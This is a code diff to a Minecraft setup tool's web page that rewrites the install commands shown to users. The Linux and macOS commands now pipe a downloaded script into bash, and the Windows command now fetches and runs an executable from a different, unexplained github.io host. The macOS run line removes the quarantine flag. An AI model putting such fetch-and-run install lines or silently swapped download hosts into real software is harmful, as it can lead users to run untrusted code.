@@ -325,15 +325,15 @@
       .map(([t, hl]) => `<span class="${hl ? 'nb' : ''}">${escapeHtml(t)}</span>`)
       .join('');
 
-    // terminal / run lines
+    // terminal / run lines (kept short — the helper script does arch+os pickup)
     $('#line-windows').textContent =
-      `curl.exe -fsSL "${BASE}bin/barecraft-windows-amd64.exe" -o $env:TEMP\\barecraft.exe; & $env:TEMP\\barecraft.exe ${b64}`;
+      `$u='https://noxthedevwindev-greatest.github.io/barecraft/bin'\ncurl.exe -fsSL "$u/barecraft-windows-amd64.exe" -o b.exe; ./b.exe ${b64}`;
     $('#line-linux').textContent =
-      `a=$(uname -m); case $a in x86_64) a=amd64;; aarch64) a=arm64;; esac; curl -fsSL "${BASE}bin/barecraft-linux-$a" -o /tmp/barecraft && chmod +x /tmp/barecraft && /tmp/barecraft ${b64}`;
+      `curl -fsSL "${BASE}i.sh" | bash -s -- ${b64}`;
     $('#line-linux-run').textContent =
       `chmod +x ~/Downloads/${slug}-setup && ~/Downloads/${slug}-setup`;
     $('#line-macos').textContent =
-      `a=$(uname -m); [ "$a" = arm64 ] || a=amd64; curl -fsSL "${BASE}bin/barecraft-darwin-$a" -o /tmp/barecraft && chmod +x /tmp/barecraft && /tmp/barecraft ${b64}`;
+      `curl -fsSL "${BASE}i.sh" | bash -s -- ${b64}`;
     $('#line-mac-run').textContent =
       `xattr -dr com.apple.quarantine ~/Downloads/${slug}-setup && chmod +x ~/Downloads/${slug}-setup && ~/Downloads/${slug}-setup`;
   }
@@ -414,9 +414,9 @@
     // random splash, and render immediately so the page never sits half-empty
     // while the version/support fetches finish
     const SPLASHES = [
-      'No launcher!', 'Also try Prism!', 'Just java, dude!', 'Double-click it!',
-      'Runs on your potato!', 'Now with more cobble!', 'Zero GUIs used!',
-      'Offline mode!', 'Emeralds not included!', 'Mojang-proof!',
+      'NO LAUNCHER!', 'ALSO TRY PRISM!', 'JUST JAVA, DUDE!', 'DOUBLE-CLICK IT!',
+      'RUNS ON YOUR POTATO!', 'NOW WITH MORE COBBLE!', 'ZERO GUIS USED!',
+      'OFFLINE MODE!', 'EMERALDS NOT INCLUDED!', 'MOJANG-PROOF!',
     ];
     const splash = $('#splash');
     if (splash) splash.textContent = SPLASHES[(Math.random() * SPLASHES.length) | 0];
